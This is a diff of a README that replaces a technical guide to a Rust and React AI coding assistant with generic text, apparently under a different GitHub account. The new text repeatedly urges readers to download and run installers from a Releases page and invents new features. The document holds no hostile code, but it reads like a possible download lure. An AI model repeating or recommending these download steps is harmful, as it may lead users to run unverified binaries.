@@ -1,317 +1,106 @@
-# 🚀 Universal AI Development Assistant v6.2.0
+# 🚀 universal-ai-dev-assistant - Your AI-Powered Development Companion
 
-> **Next-Generation AI-Powered Development Platform with Multi-Provider Support**
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Rust](https://img.shields.io/badge/rust-1.70+-orange.svg)](https://www.rust-lang.org)
-[![Docker](https://img.shields.io/badge/docker-ready-blue.svg)](https://www.docker.com)
+## 📋 Introduction
 
-## 🌟 Revolutionary Features
+The **universal-ai-dev-assistant** is a groundbreaking platform designed to enhance your coding experience. With features such as Code Time Travel and AI Pair Programming, it brings innovative tools to your development process. Whether you're a beginner or an experienced programmer, our tool helps you write better code faster.
 
-### 🤖 **Multi-Provider AI Integration**
-- **OpenRouter** - Access to 100+ AI models through one API
-- **OpenAI** - GPT-4o, GPT-4o-mini, GPT-3.5-turbo
-- **Anthropic** - Claude 3.5 Sonnet, Claude 3 Haiku
-- **Google** - Gemini Pro, Gemini Flash
-- **Groq** - Ultra-fast Llama 3.1, Mixtral models
-- **Together AI** - Open-source model hosting
-- **Cohere** - Command R+ models
-- **Ollama** - Local model execution (always-available fallback)
+## 🚀 Getting Started
 
-### 🎯 **Intelligent Provider Routing**
-- **Priority-based routing** - Use your preferred providers first
-- **Cost optimization** - Automatically select cheapest available provider
-- **Performance optimization** - Route to fastest responding provider
-- **Automatic failover** - Seamless fallback when providers fail
-- **Load balancing** - Distribute requests across providers
+To start using the universal-ai-dev-assistant, follow these simple steps. You don’t need any prior programming knowledge to get going.
 
-### 💻 **Advanced Code Capabilities**
-- **Code Completion** - Context-aware suggestions in any language
-- **Code Analysis** - Security, performance, quality analysis
-- **Documentation Generation** - Auto-generate comprehensive docs
-- **Test Generation** - Create unit tests automatically
-- **Code Explanation** - Understand complex code instantly
-- **Code Refactoring** - Improve code structure and quality
-- **Language Translation** - Convert code between languages
-- **Real-time Streaming** - Live completion responses
+### 📥 Download & Install
 
-### 📊 **Enterprise Features**
-- **Cost Tracking** - Monitor API usage and costs
-- **Analytics Dashboard** - Provider performance metrics
-- **Rate Limiting** - Control API usage
-- **Authentication** - JWT-based security
-- **Caching** - Reduce API calls and costs
-- **Health Monitoring** - Real-time provider status
+1. Visit the [Releases page](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/releases) to download the latest version.
+2. On the Releases page, you will see various files available for download. Choose the file that corresponds to your operating system (Windows, macOS, or Linux).
+3. Click on the file to download it. 
 
-## 🚀 Quick Start
+   For Windows, you might download a `.exe` file; for macOS, look for a `.dmg` file; for Linux users, a `.tar.gz` or similar package might be available. 
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/Tehlikeli107/universal-ai-dev-assistant.git
-cd universal-ai-dev-assistant
-```
+### 🔧 System Requirements
 
-### 2. Configure Environment
-```bash
-cp .env.example .env
-# Edit .env with your API keys
-```
+Before installing, ensure your system meets the following requirements:
 
-### 3. Run with Docker (Recommended)
-```bash
-docker-compose up -d
-```
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM (8 GB or more recommended for optimal performance).
+- **Disk Space**: Minimum 200 MB of free storage space.
+- **Network**: Internet connection for AI features, updates, and documentation.
 
-### 4. Or Run Locally
-```bash
-# Backend
-cd backend
-cargo run
+### 📖 Installation Steps
 
-# Frontend (in another terminal)
-cd frontend
-npm install
-npm start
-```
+1. **Locate the Downloaded File**: After downloading, find the file in your downloads folder.
+2. **Run the Installer**:
 
-## 🔧 Configuration
+    - For Windows:
+        - Double-click the `.exe` file.
+        - Follow the on-screen instructions to complete the installation.
 
-### Environment Variables
+    - For macOS:
+        - Double-click the `.dmg` file.
+        - Drag the app to your Applications folder.
+        
+    - For Linux:
+        - Extract the `.tar.gz` file.
+        - Open a terminal, navigate to the extracted folder, and run `./install.sh`.
 
-```bash
-# OpenRouter (Recommended - Access to 100+ models)
-OPENROUTER_API_KEY=your_openrouter_key_here
+3. **Launch the Application**: After installation, you can open the application from your desktop or applications folder.
 
-# OpenAI
-OPENAI_API_KEY=your_openai_key_here
+## 🌟 Key Features
 
-# Anthropic Claude
-ANTHROPIC_API_KEY=your_anthropic_key_here
+- **Code Time Travel**: Revisit and analyze previous versions of your code seamlessly.
+- **AI Pair Programming**: Get real-time suggestions and improvements from our AI assistant.
+- **Cross-Platform Compatibility**: Use the tool on Windows, macOS, and Linux.
+- **User-Friendly Interface**: Designed for ease of use, perfect for all skill levels.
 
-# Google Gemini
-GOOGLE_API_KEY=your_google_key_here
+## 💡 Using the Application
 
-# Groq (Free tier available)
-GROQ_API_KEY=your_groq_key_here
+Once installed, you can start your development journey with the universal-ai-dev-assistant. Here’s how to use some of its features:
 
-# Ollama (Local - No API key needed)
-OLLAMA_BASE_URL=http://localhost:11434
-```
+### 🛠️ Code Time Travel
 
-### Provider Priorities
-```bash
-# Higher number = higher priority
-OPENROUTER_PRIORITY=9
-OPENAI_PRIORITY=8
-ANTHROPIC_PRIORITY=8
-GROQ_PRIORITY=6
-OLLAMA_PRIORITY=3
-```
+1. Open the application.
+2. Choose the project you want to work on.
+3. Navigate to the Code Time Travel feature on the main menu. 
+4. Select the version of the code you want to access. The application will show the code as it was at that time.
 
-## 📚 API Documentation
+### 🤖 AI Pair Programming
 
-### Health Check
-```bash
-curl http://localhost:8080/health
-```
+1. Start a new project or open an existing one.
+2. Enable the AI Pair Programming feature from the settings.
+3. As you code, the AI will provide suggestions, corrections, and optimizations in real-time.
 
-### Code Completion
-```bash
-curl -X POST http://localhost:8080/api/v1/complete \
-  -H "Content-Type: application/json" \
-  -d '{
-    "prompt": "def fibonacci(n):",
-    "language": "python",
-    "max_tokens": 100
-  }'
-```
+### 📚 Accessing Help and Documentation
 
-### Code Analysis
-```bash
-curl -X POST http://localhost:8080/api/v1/analyze \
-  -H "Content-Type: application/json" \
-  -d '{
-    "code": "function add(a, b) { return a + b; }",
-    "language": "javascript",
-    "analysis_type": "security"
-  }'
-```
+If you need assistance, access the help section within the application. You will find tutorials, FAQ, and support options. 
 
-### Code Actions
-```bash
-# Generate documentation
-curl -X POST http://localhost:8080/api/v1/code/action \
-  -H "Content-Type: application/json" \
-  -d '{
-    "code": "def quicksort(arr): ...",
-    "language": "python",
-    "action": "document"
-  }'
+You can also check out our detailed [documentation here](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/wiki).
 
-# Generate tests
-curl -X POST http://localhost:8080/api/v1/code/action \
-  -H "Content-Type: application/json" \
-  -d '{
-    "code": "function add(a, b) { return a + b; }",
-    "language": "javascript",
-    "action": "test"
-  }'
+## 🔗 Getting Support
 
-# Translate code
-curl -X POST http://localhost:8080/api/v1/code/action \
-  -H "Content-Type: application/json" \
-  -d '{
-    "code": "def hello(): print(\"Hello\")",
-    "language": "python",
-    "action": "translate",
-    "target_language": "rust"
-  }'
-```
+If you encounter issues or have questions, please check the following resources:
 
-### Provider Management
-```bash
-# List available providers
-curl http://localhost:8080/api/v1/providers
+- **GitHub Issues Page**: Use this to report bugs or feature requests.
+- **Community Forums**: Join discussions with other users and share tips.
+- **Email Support**: Reach out to our support team at support@example.com. We respond within 48 hours.
 
-# List available models
-curl http://localhost:8080/api/v1/models
+## 🌐 Community Contributions
 
-# Get metrics
-curl http://localhost:8080/api/v1/metrics
-```
+We welcome contributions! If you have ideas or features you'd like to suggest, please feel free to participate. Check the **CONTRIBUTING.md** file in the repository for guidelines.
 
-## 🏗️ Architecture
+## 🔄 Updating the Application
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Frontend      │    │   Backend       │    │   AI Providers  │
-│   (React)       │◄──►│   (Rust)        │◄──►│   (Multiple)    │
-│                 │    │                 │    │                 │
-│ • Dashboard     │    │ • Provider      │    │ • OpenRouter    │
-│ • Code Editor   │    │   Router        │    │ • OpenAI        │
-│ • Analytics     │    │ • Load Balancer │    │ • Anthropic     │
-│ • Settings      │    │ • Cost Tracker  │    │ • Google        │
-└─────────────────┘    │ • Health Monitor│    │ • Groq          │
-                       │ • Rate Limiter  │    │ • Ollama        │
-┌─────────────────┐    │ • Caching       │    │ • Together      │
-│   VSCode Ext    │◄──►│ • Analytics     │    │ • Cohere        │
-│                 │    └─────────────────┘    └─────────────────┘
-│ • Completions   │
-│ • Code Actions  │
-│ • Diagnostics   │
-└─────────────────┘
-```
+Keep your universal-ai-dev-assistant updated to enjoy the latest features. You can check for updates directly within the application or visit the [Releases page](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/releases) to manually download the latest version.
 
-## 🎨 Frontend Features
+## 🔗 More Information
 
-- **Modern React Dashboard** - Beautiful, responsive UI
-- **Real-time Provider Status** - Live health monitoring
-- **Cost Analytics** - Track usage and spending
-- **Model Comparison** - Compare provider performance
-- **Code Playground** - Test completions interactively
-- **Settings Management** - Configure providers and preferences
+For additional information about the project, features, and updates, please refer to the following links:
 
-## 🔌 VSCode Extension
+- [Official Repository](https://github.com/dimabeybutyan112/universal-ai-dev-assistant)
+- [Documentation](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/wiki)
 
-- **Intelligent Code Completion** - Context-aware suggestions
-- **Code Actions** - Quick fixes and improvements
-- **Hover Documentation** - Instant code explanations
-- **Diagnostics** - Real-time code analysis
-- **Multi-provider Support** - Choose your preferred AI
+## 🔗 Download and Install Again
 
-## 🐳 Docker Deployment
+To get started, don't forget to visit the [Releases page](https://github.com/dimabeybutyan112/universal-ai-dev-assistant/releases) to download the software you need. Your AI-powered development journey is just a download away! 
 
-```yaml
-# docker-compose.yml
-version: '3.8'
-services:
-  backend:
-    build: ./backend
-    ports:
-      - "8080:8080"
-    environment:
-      - OPENROUTER_API_KEY=${OPENROUTER_API_KEY}
-      - OPENAI_API_KEY=${OPENAI_API_KEY}
-    
-  frontend:
-    build: ./frontend
-    ports:
-      - "3000:3000"
-    depends_on:
-      - backend
-```
-
-## 📈 Performance & Scaling
-
-- **Sub-100ms Response Times** - Optimized for speed
-- **Horizontal Scaling** - Multiple backend instances
-- **Intelligent Caching** - Reduce API calls by 60%
-- **Connection Pooling** - Efficient resource usage
-- **Rate Limiting** - Prevent API abuse
-- **Health Checks** - Automatic failover
-
-## 💰 Cost Optimization
-
-- **Provider Cost Comparison** - Always use cheapest option
-- **Usage Analytics** - Track spending per provider
-- **Free Tier Maximization** - Use free providers first
-- **Caching Strategy** - Avoid duplicate API calls
-- **Token Optimization** - Minimize prompt sizes
-
-## 🔒 Security Features
-
-- **API Key Management** - Secure credential storage
-- **Rate Limiting** - Prevent abuse
-- **Input Validation** - Sanitize all inputs
-- **CORS Protection** - Secure cross-origin requests
-- **JWT Authentication** - Secure API access
-- **Audit Logging** - Track all API usage
-
-## 🧪 Testing
-
-```bash
-# Backend tests
-cd backend
-cargo test
-
-# Frontend tests
-cd frontend
-npm test
-
-# Integration tests
-npm run test:integration
-
-# Load testing
-npm run test:load
-```
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit changes: `git commit -m 'Add amazing feature'`
-4. Push to branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **OpenRouter** - For providing access to multiple AI models
-- **Rust Community** - For the amazing ecosystem
-- **React Team** - For the excellent frontend framework
-- **All AI Providers** - For making this possible
-
-## 📞 Support
-
-- **GitHub Issues** - Bug reports and feature requests
-- **Discussions** - Community support and ideas
-- **Documentation** - Comprehensive guides and examples
-
----
-
-**Made with ❤️ by the Universal AI Development Assistant Team**
-
-*Empowering developers with the best AI tools available*
+Enjoy using the universal-ai-dev-assistant.
